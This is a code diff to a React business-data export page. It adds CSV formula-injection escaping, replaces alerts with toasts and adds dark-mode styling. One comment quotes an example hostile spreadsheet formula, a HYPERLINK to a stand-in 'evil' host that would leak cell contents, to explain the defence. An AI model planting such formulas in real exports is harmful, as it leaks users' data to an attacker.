@@ -3,6 +3,7 @@
 import { useState, type ReactNode } from "react";
 import { api } from "@/lib/api";
 import { useBusiness } from "@/lib/data-sync";
+import { useToast } from "@/components/toast";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -36,19 +37,27 @@ import type {
 
 // ─── CSV helper ──────────────────────────────────────────────────────────────
 
+/**
+ * CSV-injection / formula-injection defense (CWE-1236):
+ * Excel, Numbers, LibreOffice, and Google Sheets all evaluate cells that begin
+ * with =, +, -, @, tab, or carriage-return as formulas. A hostile contact named
+ * '=HYPERLINK("https://evil/?x="&A1,"click")' would trigger code when an owner
+ * exports and opens the CSV. Prefixing such cells with a single quote forces
+ * spreadsheets to render them as plain text.
+ */
+function escapeCsvCell(raw: unknown): string {
+  const str = String(raw ?? "");
+  const safe = /^[=+\-@\t\r]/.test(str) ? `'${str}` : str;
+  if (safe.includes(",") || safe.includes('"') || safe.includes("\n")) {
+    return `"${safe.replace(/"/g, '""')}"`;
+  }
+  return safe;
+}
+
 function downloadCsv(filename: string, headers: string[], rows: string[][]) {
   const csvContent = [
-    headers.join(","),
-    ...rows.map((row) =>
-      row
-        .map((cell) => {
-          const str = String(cell ?? "");
-          if (str.includes(",") || str.includes('"') || str.includes("\n"))
-            return `"${str.replace(/"/g, '""')}"`;
-          return str;
-        })
-        .join(",")
-    ),
+    headers.map(escapeCsvCell).join(","),
+    ...rows.map((row) => row.map(escapeCsvCell).join(",")),
   ].join("\n");
 
   const blob = new Blob(["\ufeff" + csvContent], {
@@ -179,13 +188,13 @@ function ExportCard({
   return (
     <Card>
       <CardHeader className="pb-2">
-        <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
+        <CardTitle className="text-sm font-semibold text-slate-700 dark:text-slate-300 flex items-center gap-2">
           {icon}
           {title}
         </CardTitle>
       </CardHeader>
       <CardContent className="space-y-3">
-        <p className="text-xs text-slate-400">{description}</p>
+        <p className="text-xs text-slate-400 dark:text-slate-500">{description}</p>
         {children}
         <div className="flex gap-2">
           <Button onClick={onExport} disabled={loading} className="flex-1">
@@ -218,7 +227,7 @@ function DateRangeFilter({
   return (
     <div className="grid grid-cols-2 gap-2">
       <div>
-        <Label className="text-xs text-slate-500">From</Label>
+        <Label className="text-xs text-slate-500 dark:text-slate-400">From</Label>
         <Input
           type="date"
           value={from}
@@ -227,7 +236,7 @@ function DateRangeFilter({
         />
       </div>
       <div>
-        <Label className="text-xs text-slate-500">To</Label>
+        <Label className="text-xs text-slate-500 dark:text-slate-400">To</Label>
         <Input
           type="date"
           value={to}
@@ -243,6 +252,7 @@ function DateRangeFilter({
 
 export default function ExportPage() {
   const business = useBusiness();
+  const { toast } = useToast();
   const tz = business?.timezone ?? "Africa/Lagos";
   const bizName = business?.name ?? "My Business";
   const currencyMeta: Record<string, string> = { NGN: "\u20A6", GHS: "GH\u20B5", USD: "$", GBP: "\u00A3", KES: "KSh", ZAR: "R", TZS: "TSh", UGX: "USh", RWF: "RF", XAF: "FCFA", XOF: "CFA", EGP: "E\u00A3", ETB: "Br" };
@@ -295,7 +305,7 @@ export default function ExportPage() {
       if (mode === "csv") downloadCsv(`ojunai-sales-${todayStamp()}.csv`, headers, rows);
       else printReport("Sales Report", headers, rows, bizName);
     } catch {
-      alert("Failed to export sales. Please try again.");
+      toast.error("Failed to export sales", "Please try again.");
     } finally {
       setSalesLoading(false);
     }
@@ -328,7 +338,7 @@ export default function ExportPage() {
       if (mode === "csv") downloadCsv(`ojunai-expenses-${todayStamp()}.csv`, headers, rows);
       else printReport("Expenses Report", headers, rows, bizName);
     } catch {
-      alert("Failed to export expenses. Please try again.");
+      toast.error("Failed to export expenses", "Please try again.");
     } finally {
       setExpensesLoading(false);
     }
@@ -359,7 +369,7 @@ export default function ExportPage() {
       if (mode === "csv") downloadCsv(`ojunai-inventory-${todayStamp()}.csv`, headers, rows);
       else printReport("Inventory Report", headers, rows, bizName);
     } catch {
-      alert("Failed to export products. Please try again.");
+      toast.error("Failed to export products", "Please try again.");
     } finally {
       setProductsLoading(false);
     }
@@ -385,7 +395,7 @@ export default function ExportPage() {
       if (mode === "csv") downloadCsv(`ojunai-contacts-${todayStamp()}.csv`, headers, rows);
       else printReport("Contacts Report", headers, rows, bizName);
     } catch {
-      alert("Failed to export contacts. Please try again.");
+      toast.error("Failed to export contacts", "Please try again.");
     } finally {
       setContactsLoading(false);
     }
@@ -417,7 +427,7 @@ export default function ExportPage() {
       if (mode === "csv") downloadCsv(`ojunai-activity-${todayStamp()}.csv`, headers, rows);
       else printReport("Activity Log", headers, rows, bizName);
     } catch {
-      alert("Failed to export activity log. Please try again.");
+      toast.error("Failed to export activity log", "Please try again.");
     } finally {
       setActivityLoading(false);
     }
@@ -433,7 +443,7 @@ export default function ExportPage() {
       );
       const pnl = data.data;
       if (!pnl) {
-        alert("No P&L data available.");
+        toast.info("No P&L data available");
         return;
       }
       const headers = ["Month", "Revenue", "Cost of Goods Sold", "Gross Profit", "Operating Expenses", "Net Profit", "Gross Margin %", "Net Margin %"];
@@ -462,7 +472,7 @@ export default function ExportPage() {
       if (mode === "csv") downloadCsv(`ojunai-pnl-${todayStamp()}.csv`, headers, rows);
       else printReport("Profit & Loss Statement", headers, rows, bizName);
     } catch {
-      alert("Failed to export P&L. Please try again.");
+      toast.error("Failed to export P&L", "Please try again.");
     } finally {
       setPnlLoading(false);
     }
@@ -570,7 +580,7 @@ export default function ExportPage() {
       printRichReport("Monthly Business Report", sections, bizName);
     } catch (err) {
       console.error("Monthly report error:", err);
-      alert("Failed to generate monthly report. Please try again.");
+      toast.error("Failed to generate monthly report", "Please try again.");
     } finally {
       setReportLoading(false);
     }
@@ -634,7 +644,7 @@ export default function ExportPage() {
         ])
       );
     } catch {
-      alert("Failed to generate tax package. Please try again.");
+      toast.error("Failed to generate tax package", "Please try again.");
     } finally {
       setTaxLoading(false);
     }
@@ -645,8 +655,8 @@ export default function ExportPage() {
   return (
     <div className="space-y-6">
       <div>
-        <h2 className="text-2xl font-bold text-slate-900">Export & Share</h2>
-        <p className="text-slate-500 text-sm mt-0.5">
+        <h2 className="text-2xl font-bold text-slate-900 dark:text-slate-50">Export & Share</h2>
+        <p className="text-slate-500 dark:text-slate-400 text-sm mt-0.5">
           Download your business data as CSV or print-friendly PDF
         </p>
       </div>
@@ -709,9 +719,9 @@ export default function ExportPage() {
             onToChange={setExpensesTo}
           />
           <div>
-            <Label className="text-xs text-slate-500">Expense Type</Label>
+            <Label className="text-xs text-slate-500 dark:text-slate-400">Expense Type</Label>
             <select
-              className="w-full h-8 px-2 rounded-md border border-slate-200 text-xs"
+              className="w-full h-8 px-2 rounded-md border border-slate-200 dark:border-slate-800 text-xs"
               value={expenseType}
               onChange={(e) => setExpenseType(e.target.value as "all" | "operating" | "cogs")}
             >
@@ -744,7 +754,7 @@ export default function ExportPage() {
 
         {/* Activity Log */}
         <ExportCard
-          icon={<Activity size={16} className="text-slate-600" />}
+          icon={<Activity size={16} className="text-slate-600 dark:text-slate-400" />}
           title="Activity Log"
           description="Full audit trail of all business transactions and events."
           onExport={() => handleActivity("csv")}
